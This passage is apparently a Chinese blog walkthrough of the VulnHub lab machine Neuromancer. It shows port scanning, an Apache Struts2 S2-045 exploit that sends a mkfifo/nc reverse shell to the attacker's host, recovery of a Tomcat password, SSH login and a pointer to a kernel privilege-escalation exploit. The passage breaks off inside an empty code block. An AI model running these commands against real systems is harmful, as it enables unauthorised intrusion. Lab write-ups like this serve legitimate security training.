<p>其中192.168.56.102是kali的ip，192.168.56.109，和192.168.56.111都是Straylight的ip，192.168.56.100是vbox Host-only Adapter网卡的网关地址，剩下的192.168.56.110就是Neuromancer机器的ip地址。</p>
<p>使用nc扫描端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.110 $i 2&gt;&amp;1; done | grep -v &quot;Connection refused&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 65535); <span class="keyword">do</span> nc -nvz -w 1 192.168.56.110 <span class="variable">$i</span> 2&gt;&amp;1; <span class="keyword">done</span> | grep -v <span class="string">&quot;Connection refused&quot;</span></span><br><span class="line">(UNKNOWN) [192.168.56.110] 8009 (?) open</span><br><span class="line">(UNKNOWN) [192.168.56.110] 8080 (http-alt) open</span><br><span class="line">(UNKNOWN) [192.168.56.110] 34483 (?) open</span><br></pre></td></tr></table></figure>

<p>这里有三个开放的端口8009、8080和34483，但是问题是，如果尝试访问IP和端口，将看不到任何内容。为了能够加入它们，必须进行端口转发。对于端口转发，可以使用socat之类的socat，如socat TCP-LISTEN：5000,fork,reuseaddr tcp：127.0.0.1：8080，这意味着8080上的网站应该在外部的5000端口上可见。但是，由于需要处理三个端口，必须在每个命令的末尾加上＆。＆in nix告诉系统执行命令并将其置于后台。简而言之，将执行以下命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.110:8009 &amp;</span></span><br><span class="line">socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.110:8009 &amp;</span><br><span class="line"><span class="comment"># socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.110:8080 &amp;</span></span><br><span class="line">socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.110:8080 &amp;</span><br><span class="line"><span class="comment"># socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.110:34483 &amp;</span></span><br><span class="line">socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.110:34483 &amp;</span><br></pre></td></tr></table></figure>

<p>然后上nmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p 8009,8080,34483 -Pn -A --script=vuln 192.168.56.110</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8080/tcp  open  http    Apache Tomcat 9.0.0.M26</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /examples/: Sample scripts</span><br><span class="line">|   /manager/html/upload: Apache Tomcat (401 )</span><br><span class="line">|   /manager/html: Apache Tomcat (401 )</span><br><span class="line">|_  /docs/: Potentially interesting folder</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">34483/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>然后访问之前note.txt中提到的url</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub165.jpg"></p>
<p>Apache struts有一些已知的漏洞利用。当使用searchsploit搜索“apache struts”时，可以看到许多可能的利用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit apache struts</span></span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                  |  Path                                  </span><br><span class="line">                                                                                                | (/usr/share/exploitdb/)                </span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Apache Struts - <span class="string">&#x27;ParametersInterceptor&#x27;</span> Remote Code Execution (Metasploit)                      | exploits/multiple/remote/24874.rb</span><br><span class="line">Apache Struts - ClassLoader Manipulation Remote Code Execution (Metasploit)                     | exploits/multiple/remote/33142.rb</span><br><span class="line">Apache Struts - Developer Mode OGNL Execution (Metasploit)                                      | exploits/java/remote/31434.rb</span><br><span class="line">Apache Struts - Dynamic Method Invocation Remote Code Execution (Metasploit)                    | exploits/linux/remote/39756.rb</span><br><span class="line">Apache Struts - Multiple Persistent Cross-Site Scripting Vulnerabilities                        | exploits/multiple/webapps/18452.txt</span><br><span class="line">Apache Struts - OGNL Expression Injection                                                       | exploits/multiple/remote/38549.txt</span><br><span class="line">Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution                | exploits/multiple/remote/43382.py</span><br><span class="line">Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution (Metasploit)   | exploits/multiple/remote/39919.rb</span><br><span class="line">Apache Struts - includeParams Remote Code Execution (Metasploit)                                | exploits/multiple/remote/25980.rb</span><br><span class="line">Apache Struts 1.2.7 - Error Response Cross-Site Scripting                                       | exploits/multiple/remote/26542.txt</span><br><span class="line">Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution (Metasploit)                 | exploits/multiple/remote/27135.rb</span><br><span class="line">Apache Struts 2 - Namespace Redirect OGNL Injection (Metasploit)                                | exploits/multiple/remote/45367.rb</span><br><span class="line">Apache Struts 2 - Skill Name Remote Code Execution                                              | exploits/multiple/remote/37647.txt</span><br><span class="line">Apache Struts 2 - Struts 1 Plugin Showcase OGNL Code Execution (Metasploit)                     | exploits/multiple/remote/44643.rb</span><br><span class="line">Apache Struts 2 &lt; 2.3.1 - Multiple Vulnerabilities                                              | exploits/multiple/webapps/18329.txt</span><br><span class="line">Apache Struts 2.0 - <span class="string">&#x27;XSLTResult.java&#x27;</span> Arbitrary File Upload                                     | exploits/java/webapps/37009.xml</span><br><span class="line">Apache Struts 2.0.0 &lt; 2.2.1.1 - XWork <span class="string">&#x27;s:submit&#x27;</span> HTML Tag Cross-Site Scripting                  | exploits/multiple/remote/35735.txt</span><br><span class="line">Apache Struts 2.0.1 &lt; 2.3.33 / 2.5 &lt; 2.5.10 - Arbitrary Code Execution                          | exploits/multiple/remote/44556.py</span><br><span class="line">Apache Struts 2.0.9/2.1.8 - Session Tampering Security Bypass                                   | exploits/multiple/remote/36426.txt</span><br><span class="line">Apache Struts 2.2.1.1 - Remote Command Execution (Metasploit)                                   | exploits/multiple/remote/18984.rb</span><br><span class="line">Apache Struts 2.2.3 - Multiple Open Redirections                                                | exploits/multiple/remote/38666.txt</span><br><span class="line">Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution (1)                           | exploits/linux/remote/45260.py</span><br><span class="line">Apache Struts 2.3 &lt; 2.3.34 / 2.5 &lt; 2.5.16 - Remote Code Execution (2)                           | exploits/multiple/remote/45262.py</span><br><span class="line">Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - <span class="string">&#x27;Jakarta&#x27;</span> Multipart Parser OGNL Injection (Metasp | exploits/multiple/remote/41614.rb</span><br><span class="line">Apache Struts 2.3.5 &lt; 2.3.31 / 2.5 &lt; 2.5.10 - Remote Code Execution                             | exploits/linux/webapps/41570.py</span><br><span class="line">Apache Struts 2.3.x Showcase - Remote Code Execution                                            | exploits/multiple/webapps/42324.py</span><br><span class="line">Apache Struts 2.5 &lt; 2.5.12 - REST Plugin XStream Remote Code Execution                          | exploits/linux/remote/42627.py</span><br><span class="line">Apache Struts &lt; 1.3.10 / &lt; 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploi | exploits/multiple/remote/41690.rb</span><br><span class="line">Apache Struts &lt; 2.2.0 - Remote Command Execution (Metasploit)                                   | exploits/multiple/remote/17691.rb</span><br><span class="line">Apache Struts2 2.0.0 &lt; 2.3.15 - Prefixed Parameters OGNL Injection                              | exploits/multiple/webapps/44583.txt</span><br><span class="line">------------------------------------------------------------------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>从github上面clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hemVuMTYwL3N0cnV0cy1wd24=">struts-pwn项目<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python3 struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action --check</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] Status: Vulnerable!</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>
<p>表示存在CVE:2017-5638 - Apache Struts2 S2-045漏洞</p>
<h3 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h3><p>然后运行下面命令获得一个revese shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/struts-pwn<span class="comment"># python3 struts-pwn.py -u http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action -c &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f&quot;</span></span><br><span class="line"></span><br><span class="line">[*] URL: http://192.168.56.110:8080/struts2_2.3.15.1-showcase/showcase.action</span><br><span class="line">[*] CMD: <span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f</span><br><span class="line">EXCEPTION::::--&gt; HTTPConnectionPool(host=<span class="string">&#x27;192.168.56.110&#x27;</span>, port=8080): Read timed out. (<span class="built_in">read</span> <span class="built_in">timeout</span>=3)</span><br><span class="line">ERROR</span><br><span class="line">[%] Done.</span><br></pre></td></tr></table></figure>

<p>nc命令获得可交互的shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 9999 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p>成功的弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9999</span></span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">192.168.56.110: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.110] 55378</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">ta</span></span><br></pre></td></tr></table></figure>

<p>获得了Neuromancer的权限！检查“ta”用户的home目录将显示一些有趣的内容。此注释将显示tomcat目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> ai-gui-guide.txt</span><br><span class="line">Application <span class="keyword">for</span> Neuromancer remote access interface includes:</span><br><span class="line"></span><br><span class="line">-Maven    - /opt/</span><br><span class="line">-Java jdk - /usr/lib/jvm/</span><br><span class="line">-Tomcat   - /usr/local/tomcat/</span><br><span class="line">-Struts2  - /home/ta/myWebApp/</span><br><span class="line">          - war files are <span class="keyword">in</span> /root. Update these ASAP to improve security.</span><br><span class="line"></span><br><span class="line">Reduce installation of apps to ONLY what<span class="string">&#x27;s needed, seucure configurations and follow app security best practices.</span></span><br></pre></td></tr></table></figure>

<p>Tomcat将用户和密码存储在名为“tomcat-users.xml”的文件中。读取该文件将显示系统上另一个用户“lady3jane”的密码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> tomcat-users.xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">Eng.,</span><br><span class="line"></span><br><span class="line">Tomcat is still using basic auth. I encoded the password so the AI<span class="string">&#x27;s security scans don&#x27;</span>t flag it.</span><br><span class="line"></span><br><span class="line">Is this what Bob keeps talking about, <span class="string">&quot;Security by obscurity?&quot;</span></span><br><span class="line"></span><br><span class="line">Ed Occam//Sys.Engineer I//Night City</span><br><span class="line"><span class="string">&quot;Harry, I took care of it&quot;</span> - Llyod Christmas</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">  &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;Lady3Jane&quot;</span> password=<span class="string">&quot;&amp;gt;&amp;#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;&quot;</span> roles=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;both&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;tomcat,role1&quot;</span>/&gt;</span><br><span class="line">  &lt;user username=<span class="string">&quot;role1&quot;</span> password=<span class="string">&quot;&lt;must-be-changed&gt;&quot;</span> roles=<span class="string">&quot;role1&quot;</span>/&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>此外还可以通过struts 2漏洞利用工具来上传冰蝎木马来getshell :)</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub167.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub168.jpg"></p>
<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>将</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;gt;&amp;<span class="comment">#33;&amp;#88;&amp;#120;&amp;#51;&amp;#74;&amp;#97;&amp;#110;&amp;#101;&amp;#120;&amp;#88;&amp;#33;&amp;lt;</span></span><br></pre></td></tr></table></figure>

<p>html编码解密得到：&gt;!Xx3JanexX!&lt;</p>
<p>然后使用：lady3jane&#x2F;&gt;!Xx3JanexX!&lt;连接ssh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh lady3jane@192.168.56.110 -p 34483</span></span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">|                Neuromancer Secure Remote Access                |</span><br><span class="line">| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |</span><br><span class="line"> ----------------------------------------------------------------</span><br><span class="line">lady3jane@192.168.56.110<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">94 packages can be updated.</span></span><br><span class="line"><span class="string">44 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 15 23:19:21 2020 from 192.168.56.102</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ id</span></span><br><span class="line"><span class="string">uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)</span></span><br><span class="line"><span class="string">lady3jane@neuromancer:~$ whoami</span></span><br><span class="line"><span class="string">lady3jane</span></span><br></pre></td></tr></table></figure>

<p>现在，在lady3jane的主目录中，有一个文件可能每隔几分钟就会由cron执行一次。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">lady3jane@neuromancer:~$ <span class="built_in">cat</span> custom-tomcat-chk.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># Health check for Neuromancer (root) to execute every 3 minutes.</span></span><br><span class="line"><span class="comment"># ..the AI tells me it can maintain security, server health, etc w/o forced intervention,</span></span><br><span class="line"><span class="comment"># but I beg to differ...hence the cron script.</span></span><br><span class="line"></span><br><span class="line">&gt; /tmp/tomcat_status.log</span><br><span class="line"></span><br><span class="line">health=$(curl -m 5 -Is 127.0.0.1:8080 |grep HTTP/1.1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$health</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line"></span><br><span class="line">  *200*)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Tomcat is Up&quot;</span> &gt; /tmp/tomcat_status.log</span><br><span class="line">        ;;</span><br><span class="line">  *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Tomcat is down&quot;</span> &gt; /tmp/tomcat_status.log</span><br><span class="line">        ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>但是，无法利用这一点。看来这将永远不会被执行。因此，决定改用易受攻击的内核。可以找到所使用的内核漏洞的链接<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQyOTg=">Linux-Kernel-4-4-0-116-Ubuntu-16-04-4-LocalPrivilege-Escalation<i class="fa fa-external-link-alt"></i></span></p>
<p>来看一下内核提权的exp，很美。。。我何时才能达到这种水平呢？？？  :):):):):):):):):):):):)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span 